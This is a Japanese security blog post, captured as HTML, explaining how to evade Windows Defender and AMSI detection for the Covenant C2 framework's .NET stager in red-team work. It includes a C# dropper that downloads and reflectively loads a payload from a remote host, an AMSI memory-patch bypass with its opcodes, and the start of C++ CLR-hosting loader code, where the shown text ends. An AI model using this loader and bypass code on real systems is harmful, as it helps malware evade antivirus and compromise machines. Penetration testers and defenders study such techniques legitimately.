@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="ja-JP"><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<meta name="generator" content="Hugo 0.68.3" />
+	
+	<link rel="icon" href="/img/favicon.ico">
+	
+	<title>検知回避の手法 - 実行ファイル | Shooting!!!</title>
+	
+	
+	<script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Shooting!!!",
+    
+    "url": "https:\/\/www.shutingrz.com\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/www.shutingrz.com\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/www.shutingrz.com\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/www.shutingrz.com\/post\/avoid-detection-dotnet\/",
+          "name": "検知回避の手法 実行ファイル"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "検知回避の手法 - 実行ファイル",
+  "description" : "しゅーとです。今回は実行ファイル、特に.NETプログラムの検知回避に関する記事です。 ペネトレーションテストに携わりたい方だけではなく、Blu",
+  "inLanguage" : "en",
+  "wordCount":  13121 ,
+  "datePublished" : "2021-04-08T00:00:00",
+  "dateModified" : "2021-04-08T00:00:00",
+  "image" : "https:\/\/www.shutingrz.com\/img\/favicon.ico",
+  "keywords" : [ "pentest, bypass" ],
+  "mainEntityOfPage" : "https:\/\/www.shutingrz.com\/post\/avoid-detection-dotnet\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/www.shutingrz.com\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/www.shutingrz.com\/img\/favicon.ico",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="検知回避の手法 - 実行ファイル" />
+<meta property="og:description" content="しゅーとです。今回は実行ファイル、特に.NETプログラムの検知回避に関する記事です。 ペネトレーションテストに携わりたい方だけではなく、Blu">
+<meta property="og:image" content="https://www.shutingrz.com/post/avoid-detection-dotnet/images/cover.png" />
+<meta property="og:url" content="https://www.shutingrz.com/post/avoid-detection-dotnet/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Shooting!!!" />
+  <meta name="twitter:title" content="検知回避の手法 - 実行ファイル" />
+  <meta name="twitter:description" content="しゅーとです。今回は実行ファイル、特に.NETプログラムの検知回避に関する記事です。 ペネトレーションテストに携わりたい方だけではなく、Blu">
+  <meta name="twitter:image" content="https://www.shutingrz.com/post/avoid-detection-dotnet/images/cover.png" />
+  <meta name="twitter:card" content="summary" /> 
+	
+
+	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp"
+	 crossorigin="anonymous">
+	<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
+	<link href="/css/medium.css" rel="stylesheet">
+	<link href="/css/additional.css" rel="stylesheet">
+
+	
+	
+	<link rel="stylesheet" href="/css/codeblock.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/code-default.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/table.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/custom-font.css" integrity="" crossorigin="anonymous" media="screen">
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
+    <div class="container pr-0">
+        
+        <a class="navbar-brand" href="https://www.shutingrz.com//">
+
+            
+            <img src="/img/favicon.ico" alt="logo">
+            
+        </a>
+        
+
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarMediumish" aria-controls="navbarSupportedContent"
+            aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        
+        <div class="collapse navbar-collapse" id="navbarMediumish">
+            
+            <ul class="navbar-nav ml-auto">
+                 
+                <li class="nav-item ">
+                    <a class="nav-link" href="/post">Blog</a>
+                </li>
+                 
+                <li class="nav-item ">
+                    <a class="nav-link" href="/pages/about">About</a>
+                </li>
+                 
+                <li class="nav-item ">
+                    <a class="nav-link" href="https://twitter.com/shutingrz">Twitter</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </div>
+</nav>
+
+
+        <div class="site-content">   
+            <div class="container">
+<div class="mainheading">
+    <h1 class="sitetitle"><a href="/post">Shooting!!!</a></h1>
+    <p class="lead">
+         Big Brother is watching you
+    </p>
+</div><div class="main-content">
+        
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-md-2 pl-0"><div class="share sticky-top sticky-top-offset">
+    <p>Share</p>
+    <ul>
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://twitter.com/intent/tweet?text=%e6%a4%9c%e7%9f%a5%e5%9b%9e%e9%81%bf%e3%81%ae%e6%89%8b%e6%b3%95%20-%20%e5%ae%9f%e8%a1%8c%e3%83%95%e3%82%a1%e3%82%a4%e3%83%ab&url=https%3a%2f%2fwww.shutingrz.com%2fpost%2favoid-detection-dotnet%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=435');return false;">
+        <i class="fab fa-twitter"></i>
+        </a>
+        </li>
+        
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://facebook.com/sharer.php?u=https%3a%2f%2fwww.shutingrz.com%2fpost%2favoid-detection-dotnet%2f" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+        <i class="fab fa-facebook-f"></i>
+        </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://www.xing.com/spi/shares/new?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2favoid-detection-dotnet%2f" onclick="window.open(this.href, 'xing-share', 'width=550,height=435');return false;">
+        <i class="fab fa-xing"></i>
+        </a>
+        </li>        
+    </ul>
+
+    
+</div>
+</div>
+                                
+                <div class="col-md-9 flex-first flex-md-unordered">
+                    <div class="mainheading">
+                        	
+                        
+                        
+                        
+                        <div class="row post-top-meta">
+                            <div class="col-xs-12 col-md-3 col-lg-2 text-center text-md-left mb-4 mb-md-0 md-nopad-right">
+                                <img class="author-thumb" src="/img/prof.png" alt="しゅーと (@shutingrz)">
+                            </div>
+                            <div class="col-xs-12 col-md-9 col-lg-10 text-center text-md-left md-nopad-left">
+                                <a target="_blank" class="link-dark">しゅーと (@shutingrz)</a><br>
+                                <span class="author-description">
+                                    Security researcher<br>
+                                    <i class="far fa-star"></i>
+                                    Apr 8, 2021
+                                    <i class="far fa-clock clock"></i>
+                                    27 min read
+                                </span>					
+                            </div>
+                        </div>			
+                        	
+                        
+                              
+                        
+                        <h1 class="posttitle">検知回避の手法 - 実行ファイル</h1> 
+                        
+                        <div class="after-post-tags">
+                            <ul class="tags">
+                            
+                            <li>
+                            <a href="/tags/pentest">pentest</a>
+                            </li>
+                            
+                            <li>
+                            <a href="/tags/bypass">bypass</a>
+                            </li>
+                            
+                            </ul>
+                        </div>
+                    </div>
+
+                    
+                        <img class="featured-image img-fluid" src="https://www.shutingrz.com/post/avoid-detection-dotnet/images/cover.png" alt="thumbnail for this post">
+                    
+                    
+
+                    
+                    <div class="article-post">
+                        <p>しゅーとです。今回は実行ファイル、特に.NETプログラムの検知回避に関する記事です。</p>
+<p>ペネトレーションテストに携わりたい方だけではなく、Blue Teamの方もアンチウイルスソフト単体の限界を知る意味で有用と思います。</p>
+<p>.NETプログラムの例として、セットアップが簡単なC2フレームワークである、<a href="https://github.com/cobbr/Covenant">Covenant</a> の検知回避をゴールに説明していきます。</p>
+<blockquote>
+<p>この記事はあくまで検知回避の1つの手法であり、他にも様々な手法があることを留意してください。</p>
+</blockquote>
+<hr>
+<p>Covenant はOSSのC2フレームワークです。エージェントであるCovenant Gruntは.NETプログラムですが、OSSであるためにアンチウイルスベンダーに検証・解析されシグネチャが作成されています。</p>
+<p>またCovenantはStagerとして様々なLauncherが用意されており、その中に実行ファイルであるBinary Launcherが存在します。ただこのバイナリは必ずアンチウイルスソフトによって検知されます。</p>
+<p><img src="images/raw_binary_def.png" alt="raw_binary_def"></p>
+<blockquote>
+<p>Stagerは少し処理するだけで簡単に検知されなくなるよ、という意見が複数のブログで散見されますが、現在のWindows Defenderのファイル検知は難読化ツールを通すだけではクラウド保護によって検知されます。アンチウイルスや検知回避はいたちごっこが激しく、すぐに陳腐化してしまうのです。そう、あなたが見ているこの記事も。</p>
+</blockquote>
+<p>せっかくRed TeamingでCovenantを使うとしても、Windows Defenderがオフの環境でないと使えませんと顧客に説明するのは嫌ですよね？</p>
+<p>ということで、Covenantを例としていくつか存在する古今の検知回避手法を紹介しつつ、2020年現在のRed Teamingで用いられている、安全にエージェントを活動させる手法を紹介します。</p>
+<p>今回は、実行ファイルの検知回避、AMSIバイパスに関してです。</p>
+<h3 id="留意事項">留意事項</h3>
+<ul>
+<li>本記事はエージェントの確立までの検知回避にのみフォーカスを当てて解説をしています。アンチウイルスソフトの検知回避が目的であり、EDRの検知回避は範囲外です。</li>
+<li>未加工のStagerをダウンロードする関係上、一時的にDownloadフォルダをWindows Defenderの例外フォルダに設定してください。検知テストはファイルを別フォルダに移動するなどして行うと楽です。</li>
+<li><strong>最初のほうはWindows Defenderの「クラウド提供の保護」および「サンプルの自動送信」をオフにしてください</strong>。この機能は一度検知されてしまうと、本機能をオフにしてもリアルタイムスキャンで同じバイナリを検知するようになってしまいます。後半ではこれらをオンにしたうえで検知回避をします。</li>
+</ul>
+<h2 id="オリジナルバイナリの検知内容の確認">オリジナルバイナリの検知内容の確認</h2>
+<p>まずはGruntのStagerがWindows Defenderによって検知されることを確認します。</p>
+<blockquote>
+<p>※Covenantのインストール方法や使い方はここでは説明しません。Googleで検索すれば日本語記事が出てくるので、それを読むと良いでしょう。</p>
+</blockquote>
+<p>まずはCovenantのListener画面。HttpProfileはDefaultHttpProfileで、何も変更していないプレーンな状態にしています。</p>
+<p><img src="images/listener.png" alt="listener"></p>
+<p>次にCovenantのLauncherからBinary Launcherを選択し、Downloadします。すると以下のようにWindows Defenderによって検知されます。検出名は「VirTool:MSIL/Covent.A」でした。</p>
+<p><img src="images/raw_binary_def.png" alt="raw_binary_def"></p>
+<p>まずはどう検知したのかを <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a> で確認します。DefenderCheckはWindowsDefenderの コマンドラインツール「MpCmdRun.exe」 のラッパーで、ファイルを先頭から256バイトごとに結合して MpCmdRun.exe に投げてくれます。 検知される場合、検出名と検知したブロックのバイナリがhexで表示されます。</p>
+<p><img src="images/raw_binary_defcheck.png" alt="raw_binary_defcheck"></p>
+<blockquote>
+<p>DefenderCheckはあくまでファイルのどの時点で検知されたかを教えてくれるだけです。最後のブロック以前の部分にも検出名の検知対象のデータが含まれているので注意。なおDefenderCheckに後述するAMSIのチェック機能を追加した <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> というものもあります。これを使ってもOK。</p>
+<p>Windows Defenderのシグネチャ周りの話は、Allsafe様の「<a href="https://allsafe.booth.pm/items/1861943">ミミミミミッミ</a>」に書かれているので要チェックだ！</p>
+</blockquote>
+<p>hexからわかるとおり、バイナリに含まれる文字列で検知されていそうです。Covenantは .NET 製であるため、逆コンパイルが可能です。逆コンパイラであるdnSpyで見ると、いかにも検知されそうなものがたくさんバイナリに含まれていることがわかります。</p>
+<p><img src="images/dnSpy_raw.png" alt="dnSpy_raw"></p>
+<h3 id="confuserexでstageを難読化">ConfuserExでStageを難読化？</h3>
+<p>GruntのImplantおよびLauncherの画面でStagerのコードを律儀に変えてもいいですが、手動のリネームで検知回避をしようとすると最初からなかなかの労力がかかります。</p>
+<p>そういうときに、難読化ツールの <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> を用いて.NET バイナリを難読化するのが選択肢に入ります。（使い方は割愛。）</p>
+<blockquote>
+<p>オリジナルのConfuserExは更新停止しています。現在はmkaring氏のConfuserEx2を利用するといいでしょう。</p>
+</blockquote>
+<p><img src="images/stage_confuser.png" alt="stage_confuser"></p>
+<p>このようにConfuserEXを通すことで、アンチウイルスソフトのシグネチャベースの検知を回避することが可能です。</p>
+<p><img src="images/defender_check_bypass.png" alt="defender_check_bypass"></p>
+<p>しかしアンチウイルスソフトを侮ってはいけません。たとえ文字列要素を排除したとしても、Windows Defenderのクラウド保護機能はまだ検知をしてくる場合があります。CovenantをConfuserExによって難読化処理しても、クラウド保護機能はそれを「Trojan:Win32/Wacatac.C!ml」という検出名で検知するようになります。(<strong>詳細は後述</strong>)</p>
+<blockquote>
+<p>なおこういったツールで難読化すること自体がアンチウイルスソフトのフラグを立たせてしまう可能性もあるので、使用には注意が必要です。</p>
+</blockquote>
+<p>このことから、不審なバイナリであるStagerそのものをディスクに保存する手法は、単純に難読化するだけでは検知される可能性があるといえるでしょう。</p>
+<h3 id="リモートからアセンブリをメモリにロードする">リモートからアセンブリをメモリにロードする？</h3>
+<p>ファイルで検知をしてしまうなら、そもそもStagerをディスクに保存しないようにすればいいのです。</p>
+<p>といっても今回侵害の起点はexeファイルの実行としているので、ローダはどうしてもファイルとして持っておく必要があります。ただローダはエージェントを外部から取得するドロッパー機能だけを搭載することで、ファイル検知エンジン（およびクラウド保護）の検知ポイントを最小限にすることができます。</p>
+<p>それでは外部からアセンブリを取得し Assembly.Load() で動的にメモリに読み込むようにしてみましょう。これでWindows Defenderは回避できるでしょうか？</p>
+<p>Covenant はファイルホスティング機能を持っており、Launcherの画面からファイルをホスティングさせることができます。</p>
+<p><img src="images/cov_hosting.png" alt="cov_hosting"></p>
+<p>次にサーバからStagerを取得しメモリにロードするプログラムを書きます。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">Dropper</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kt">var</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">();</span>
+
+            <span class="c1">// Reflectively load assembly from a remote URL
+</span><span class="c1"></span>            <span class="kt">var</span> <span class="n">a</span> <span class="p">=</span> <span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">wc</span><span class="p">.</span><span class="n">DownloadData</span><span class="p">(</span><span class="s">&#34;http://192.168.11.254/GruntHTTP.exe&#34;</span><span class="p">));</span>
+
+            <span class="c1">// Create instance
+</span><span class="c1"></span>            <span class="kt">var</span> <span class="n">t</span> <span class="p">=</span> <span class="n">a</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;GruntStager.GruntStager&#34;</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">c</span> <span class="p">=</span> <span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
+
+            <span class="c1">// Call Stager
+</span><span class="c1"></span>            <span class="kt">var</span> <span class="n">m</span> <span class="p">=</span> <span class="n">t</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GruntStager&#34;</span><span class="p">);</span>
+            <span class="kt">var</span> <span class="n">output</span> <span class="p">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">m</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
+
+            <span class="c1">// Pause for input
+</span><span class="c1"></span>            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>コンパイルし、実行した結果がこちらです。</p>
+<p><img src="images/assembly_load_detect.png" alt="assembly_load_detect"></p>
+<p>残念ながら、ログに出ているようにWebからメモリに展開されたGruntはアンチウイルスソフトによって検知されています。</p>
+<p><code>ファイルにウイルスまたは望ましくない可能性のあるソフトウェアが含まれているため、操作は正常に完了しませんでした。</code></p>
+<p>これは <strong>AMSI</strong> の機能によるものです。AMSIとはAntimalware Scan Interfaceの略で、アンチウイルスソフトに依存しない、悪意のあるコンテンツをスキャンするインターフェースです。アンチウイルスソフトはAMSIを利用して<strong>メモリ</strong>上に読み込まれるコンテンツをスキャンできます。</p>
+<p>AMSI が動作するランタイムは複数あり、現在は PowerShell, WSH, VBA, .NET のランタイム用エンジンが存在します。これらのランタイムによってそれぞれエンジンの動作は異なります。PowerShell 5で搭載され、Powershellで実行されるコードを対象としていましたが、.NET 4.8 からはCLRに統合され、 .NET で読み込まれるアセンブリもスキャン対象になりました。</p>
+<p>そのためファイルレスだったとしても、Assembly.Load()を用いた手法ではメモリの内容がAMSIを通してアンチウイルスソフトによって検閲され、不正と判断された場合は検知されてしまいます。</p>
+<h4 id="defenderのサイレント検知">Defenderのサイレント検知</h4>
+<p>このAMSIによる検知、Windows Defender上では<strong>デスクトップ上にアラートが表示されずにサイレントで検知し終了するパターンがあります</strong>。例えば上のAssembly.Load()で読み込んだ例が顕著で、これだとどの検出名で検知したかどうかがわかりません。しかしMicrosoftのEDR製品であるMicrosoft Defender for Endpointを契約して管理コンソールで確認してみると、検出名「VirTool:MSIL/Covent.A」で検知していることがわかります。</p>
+<p><img src="images/atp_amsi_detect.png" alt="atp_amsi_detect"></p>
+<p>ファイル名の部分はamsistreamになっており、AMSI経由で検知したことがわかります。このサイレント検知現象は過去の私含め、世界の駆け出しnoob達の最初の壁になっているようです。</p>
+<h4 id="stage2読み込み時のamsi検知">Stage2読み込み時のAMSI検知</h4>
+<p>また、仮にStagerをファイル・メモリどちらでも検知回避したとしても、StagerがGruntのStage 2を取得しメモリに読み込んだ時点でまた別の検知がされることもあります。</p>
+<p>以下は検知回避を行ったStagerバイナリを実行し、Stage2で検知されたときの図です。</p>
+<p><img src="images/confuser_amsi_stage2.png" alt="confuser_amsi_stage2"></p>
+<p>メモリにStage2を読みこんだ時点で、AMSIを通じて「VirTool:MSIL/Covent.C」として検知されます。（こちらはDefenderの画面でアラートが表示されました）</p>
+<p>Covenant はStagerからの初回通信時にStage2 (ExecutorCode) をコンパイルし送信します。このコードはTemplatesから変更できるので難読化もできないことはないのですが、HTTPProfileやらの内容を置換してコンパイルする必要があったりするので、変えるのはなかなか面倒です。</p>
+<h2 id="amsiバイパスする">AMSIバイパスする</h2>
+<p>AMSI は上記のように何も対策をしていない .NET アセンブリにとって脅威です。しかしAMSIには大きな欠点があります。AMSIはユーザランドでプログラム実行時にamsi.dllをロードさせる仕組み上、当該dllに対するメモリパッチによって容易にバイパスされるのです。</p>
+<p>rasta-mouse氏が公開している .NET 製のAMSIバイパスライブラリ「<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">AMSIScanBufferBypass</a>」は、amsi.dll に存在するAMSIScanBufferの関数アドレスの先頭を、常に安全なコードであることを示す「AMSI_RESULT_CLEAN」(0x80070057)を返すように、以下のオペコードでパッチします。</p>
+<pre><code>mov    eax,0x80070057
+ret
+</code></pre><p>こうすることでAMSIは全てのコンテンツをAMSIプロバイダーに渡さずに即座にクリーンと誤認します。詳しくは氏の<a href="https://rastamouse.me/blog/asb-bypass-pt3/">ブログ投稿</a>をお読みください。</p>
+<p>ということで、先ほどのバイナリにAMSIScanBufferBypassを適用してみましょう。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>      
+<span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+   <span class="p">{</span>
+        <span class="n">Amsi</span><span class="p">.</span><span class="n">Bypass</span><span class="p">();</span>
+        <span class="kt">var</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="n">WebClient</span><span class="p">();</span>
+<span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
+</code></pre></div><p>AMSIScanBufferBypassのコードをローダーと同じところにおいて、Bypass()を呼び出すだけです。</p>
+<p>ビルド後はいったんConfuserEXで難読化しておきます（そのままだとバイパスコードが「Win32/AmsiTamper.B」として検知されます）。</p>
+<p>難読化したバイナリを実行した結果が以下です。</p>
+<p><img src="images/amsi_bypass_rasta.png" alt="amsi_bypass_rasta"></p>
+<p>無事、Windows Defenderの検知を回避してAMSIバイパスを発火させ、Stage2のAMSIスキャンもバイパスしてGruntがアクティベーションされました。</p>
+<h4 id="おまけ-amsi対応版-defendercheck">おまけ: AMSI対応版 DefenderCheck</h4>
+<p>オリジナルのDefenderCheckはファイルのスキャンのみに対応していましたが、rasta-mouse氏がフォークした「<a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a>」はAMSIにも対応しています。原理は単純で、DefenderCheckと同じようにブロックごとにデータを分割しAMSIScanBufferに投げるという実装です。もしあなたがStagerを外部サーバに配置してドロップする方法をとるなら、事前にThreatCheckで検知テストすることをお勧めします。</p>
+<h2 id="アンマネージドコードでamsiバイパス">アンマネージドコードでAMSIバイパス</h2>
+<h3 id="net-製amsiバイパスの罠">.NET 製AMSIバイパスの罠</h3>
+<p>前項では .NET 製のローダにAMSIバイパスを組み込んでStagerをロードしました。ただ .NET 製プログラムを使ったAMSIバイパスには少し不安が残ります。.NET アセンブリではバイパスする以前から既にamsi.dllが読み込まれている以上、<strong>AMSIバイパスのコードがAMSIによって検知される</strong>という<strong>鶏卵問題</strong>に直面する可能性があるのです。</p>
+<p>わかりやすい例として、AMSIBufferBypassを外部からメモリに読み込み発火させることを考えましょう。以下のようなコードになります。</p>
+<pre><code>Assembly.Load(wc.DownloadData(&quot;http://192.168.11.254/ASBBypass.dll&quot;));
+</code></pre><p>これを実行すると、やはりAMSIにて検知され、実行がブロックされました。以下はDefender ATPの画面です。</p>
+<p><img src="images/amsi_tamper_detected_atp.png" alt="amsi_tamper_detected_atp"></p>
+<p>ThreatCheck での実行結果はこちらです。</p>
+<p><img src="images/threatcheck_asb_detect.png" alt="threatcheck_asb_detect"></p>
+<p>オリジナルのASBBypassに紐づくもの(GUID, アセンブリ情報, pdb)を検知するほか、それらの情報を削除しても、画像のようにまだ検知する部分があります。赤枠で囲ったものは、パッチするオペコード「mov eax, 0x80070057 / ret」の部分です。</p>
+<p>これを回避するためにはいくつかの方法が考えられます。よくあるのがバイパスコードの<a href="https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/">ルーチン変更</a>や暗号化です。実際、そのようにAMSIバイパスコードをカスタマイズすれば割と検知されなくなります。</p>
+<blockquote>
+<p>ルーチン変更については次回説明予定です。</p>
+</blockquote>
+<h3 id="そもそもamsiを避ける">そもそもAMSIを避ける</h3>
+<p>もうひとつ鶏卵問題を避ける方法として考えられるのは、そもそもamsi.dllがロードされないアンマネージドコードのバイナリを利用することです（ファイルスキャンを回避するテクニックは結局必要になりますが）。いわゆる C/C++ で書かれるようなネイティブプログラムですね。</p>
+<p>そもそも全ての侵害を .NET を使わずにアンマネージドコードで済ませるならAMSIなんて気にする必要はありませんが、あいにくCovenantは .NET 製なのです。そのためアンマネージドコードでAMSIバイパスを行い、 .NET アセンブリを読み込み実行させる必要があります。</p>
+<p>これを可能とする実用的なものは先人たちが作ってくれています。<strong>donut</strong> です。ただこのツールの紹介はあとにして、ここではAMSIバイパスしたうえでアンマネージドコードから .NET アセンブリを読み込む簡単な実証コードを紹介します。（脱スクリプトキディ！）</p>
+<h3 id="executeindefaultappdomain">ExecuteInDefaultAppDomain()</h3>
+<p>アンマネージドコードから .NET アセンブリを呼び出す方法は昔から存在します。.NET ランタイム、つまりCLRを扱うためにドメイン中立アセンブリとして mscorlib.dll がいます。このdllが提供しているAPIを使って .NET アセンブリを処理してもらえばいいのです。</p>
+<p>static メソッドを呼ぶ用途だけなら ExecuteInDefaultAppDomain() を利用して簡単に .NET アセンブリを呼び出すことができます。ただし、このメソッドから呼び出されるコードは必ず以下のシグネチャが必要です(当然メソッド名・引数名は自由です)。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="k">static</span> <span class="kt">int</span> <span class="n">pwzMethodName</span> <span class="p">(</span><span class="n">String</span> <span class="n">pwzArgument</span><span class="p">)</span>
+</code></pre></div><p>例として「Hello, World!」を出力する .NET プログラムを作成します。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Windows.Forms</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">hello</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="n">Say</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">MessageBox</span><span class="p">.</span><span class="n">Show</span><span class="p">(</span><span class="s">&#34;Hello, World!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">static</span> <span class="kt">int</span> <span class="n">HostingSay</span><span class="p">(</span><span class="n">String</span> <span class="n">pwzArgument</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">Say</span><span class="p">();</span>
+            <span class="k">return</span> <span class="m">0</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">Say</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div><p>ExecuteInDefaultAppDomain() の要求に一致させるため、HostingSay() を実装しています。<br>
+コンパイルし、hello.exeを生成します。</p>
+<div class="highlight"><pre class="chroma"><code class="language-bat" data-lang="bat"><span class="p">&gt;</span> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe hello.cs
+</code></pre></div><p>このアセンブリを呼び出す C++ コードが以下です。</p>
+<div class="highlight"><pre class="chroma"><code class="language-c++" data-lang="c++"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;mscoree.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;corerror.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;metahost.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&#34;callnet.h&#34;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#pragma comment (lib, &#34;mscoree.lib&#34;)
+</span><span class="cp">#import &#34;mscorlib.tlb&#34; raw_interfaces_only high_property_prefixes(&#34;_get&#34;,&#34;_put&#34;,&#34;_putref&#34;) rename(&#34;ReportEvent&#34;,&#34;InteropServices_ReportEvent&#34;) rename(&#34;or&#34;,&#34;oref&#34;)
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+	
+    <span class="n">HRESULT</span> <span class="n">hr</span><span class="p">;</span>
+    <span class="n">ICLRMetaHost</span><span class="o">*</span> <span class="n">pMetaHost</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">ICLRRuntimeInfo</span><span class="o">*</span> <span class="n">pRuntimeInfo</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">ICLRRuntimeHost</span><span class="o">*</span> <span class="n">pClrRuntimeHost</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">TCHAR</span>           <span class="n">szBuf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+
+    <span class="c1">// build runtime
+</span><span class="c1"></span>    <span class="n">hr</span> <span class="o">=</span> <span class="n">CLRCreateInstance</span><span class="p">(</span><span class="n">CLSID_CLRMetaHost</span><span class="p">,</span> <span class="n">IID_PPV_ARGS</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pMetaHost</span><span class="p">));</span>
